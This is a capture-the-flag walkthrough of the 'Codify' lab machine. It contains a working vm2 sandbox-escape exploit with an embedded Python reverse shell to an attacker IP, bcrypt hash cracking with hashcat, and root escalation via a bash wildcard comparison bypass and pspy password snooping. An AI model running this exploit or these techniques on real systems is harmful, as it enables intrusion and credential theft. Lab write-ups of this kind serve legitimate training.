@@ -1,0 +1,191 @@
+Codify: Vulnerabilities: Codify CVE sandbox bypass, exposed mysql credentials file, Script password bypass/password dump
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.52.35
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
+|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://codify.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+3000/tcp open  http    Node.js Express framework
+|_http-title: Codify
+Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ echo 10.129.52.35 codify.htb | sudo tee -a /etc/hosts
+
+Codify.htb takes us to a place where we can test our node.js code easily
+
+“This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time.”
+
+http://codify.htb/editor 
+
+console.log('Hello, World!');
+Output is “Hello, World!”
+
+Let’s see if we can form some type of reverse shell. 
+
+Burp suite HTTP post request:
+POST /run HTTP/1.1
+Host: codify.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://codify.htb/editor
+Content-Type: application/json
+Content-Length: 51
+Origin: http://codify.htb
+DNT: 1
+Connection: close
+Sec-GPC: 1
+
+{"code":"Y29uc29sZS5sb2coJ0hlbGxvLCBXb3JsZCEnKTsK"}
+
+
+Codify is using library of vm2 3.9.16 
+
+https://security.snyk.io/vuln/SNYK-JS-VM2-5537100 
+-Given the CVE above, this is susceptible to a sandbox bypass
+
+
+Run this code in the editor while having netcat listener:
+const { VM } = require("vm2");
+const vm = new VM();
+
+const code = `
+  const err = new Error();
+  err.name = {
+    toString: new Proxy(() => "", {
+      apply(target, thiz, args) {
+        const process = args.constructor.constructor("return process")();
+        throw process.mainModule.require("child_process").execSync("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.10.14.217\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\", \\"-i\\"]);'").toString();
+      },
+    }),
+  };
+  try {
+    err.stack;
+  } catch (stdout) {
+    stdout;
+  }
+`;
+
+console.log(vm.run(code));
+
+Now we have initial foothold access into svc
+
+Privilege Escalation:
+
+We are going to use Linpeas.sh
+https://github.com/peass-ng/PEASS-ng/releases/tag/20240721-1e44f951 
+
+
+
+ ╔══════════╣ Users with console
+joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+svc:x:1001:1001:,,,:/home/svc:/bin/bash
+
+In the /var/www/contact directory we found a sqllite db file called tickets.db
+
+sqlite> select * from users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+
+
+└──╼ [★]$ hashid '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
+Analyzing '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+
+hashcat --force -m 3200 hash.txt /usr/share/wordlists/rockyou.txt.gz 
+
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2
+Time.Started.....: Thu Jul 25 12:56:50 2024, (1 min, 9 secs)
+Time.Estimated...: Thu Jul 25 12:57:59 2024, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#2.........:       20 H/s (3.03ms) @ Accel:4 Loops:16 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1360/14344385 (0.01%)
+Rejected.........: 0/1360 (0.00%)
+Restore.Point....: 1344/14344385 (0.01%)
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4080-4096
+Candidate.Engine.: Device Generator
+Candidates.#2....: teacher -> 080808
+
+ssh joshua@10.129.52.35
+
+joshua@codify:~$ cat user.txt 
+339e7b8bca9a5d1bfa70d3067750b679
+
+joshua@codify:~$ sudo -l
+[sudo] password for joshua: 
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+
+
+joshua@codify:/opt/scripts$ cat mysql-backup.sh 
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+
+joshua@codify:/opt/scripts$ ls -l
+total 4
+-rwxr-xr-x 1 root root 928 Nov  2  2023 mysql-backup.sh
+
+
+We use wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s in order to watch the process of the script running
+
+The script has two vulnerabilities
+You can use wildcard * to give it a valid root password
+You can watch the process dump out the password with mysqldump using pspy64s
+
+2024/07/25 18:12:14 CMD: UID=0    PID=21228  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys 
+
+Root password: kljh12k3jhaskjh12kjh3 
+
+Now we have root access:
+root@codify:~# cat root.txt
+64e21c7bb2df46eb74cdd2925f86e286
